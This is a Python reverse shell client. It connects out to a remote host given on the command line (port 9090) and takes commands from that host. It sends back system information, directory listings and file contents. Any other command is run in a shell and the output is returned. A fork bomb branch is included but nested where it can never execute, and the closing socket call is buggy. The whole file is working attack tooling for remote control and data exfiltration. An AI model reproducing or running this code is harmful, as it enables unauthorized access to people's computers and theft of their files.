import socket
import subprocess
import os,sys,getpass
import platform
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

RHOST = sys.argv[1] # add your ip
RPORT = 9090 #add your port

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((RHOST, RPORT))

while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8")
        if cmd == "list":                                            # List files in the dir
            sock.send(str(os.listdir(".")).encode())
            if cmd == "forkbomb":   # Forkbomb
                while True:
                   os.fork()
        elif cmd.split(" ")[0] == "cd":                      # Change directory
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())
        elif cmd == "sysinfo":                                 # Get system info
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())               # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:

                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        elif cmd == "exit":                       # Terminate the connection
            sock.send(b"exit")
            break
        else:                                             # Run any other command
          comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          STDOUT, STDERR = comm.communicate()
          if not STDOUT:
            sock.send(STDERR)
          else:
            sock.send(STDOUT)
        if not cmd:                                   # If the connection terminates
            print("Connection dropped")
            break
    except Exception as e:
        print("There is an error while running this program")
socket.close()
